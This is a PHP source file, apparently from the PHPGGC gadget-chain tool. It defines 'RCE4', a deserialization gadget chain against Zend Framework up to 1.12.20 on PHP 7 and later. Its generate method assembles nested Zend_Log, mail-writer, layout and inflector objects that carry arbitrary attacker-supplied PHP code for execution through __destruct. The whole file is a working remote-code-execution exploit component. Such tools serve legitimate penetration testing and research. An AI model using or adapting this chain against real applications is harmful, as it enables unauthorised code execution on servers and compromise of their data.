<?php

namespace GadgetChain\ZendFramework;

class RCE4 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '? <= 1.12.20';
    public static $vector = '__destruct';
    public static $author = 'ydyachenko';

    public static $information = '
        - Based on ZendFramework/RCE1
        - Works on PHP >= 7.0.0
    ';

    public function generate(array $parameters)
    {
        return new \Zend_Log(
            [new \Zend_Log_Writer_Mail(
                 [1],
                 [],
                 new \Zend_Mail,
                 new \Zend_Layout(
                     new \Zend_Filter_Inflector(),
                     true,
                     $parameters['code']
                 )
             )]
        );
    }
}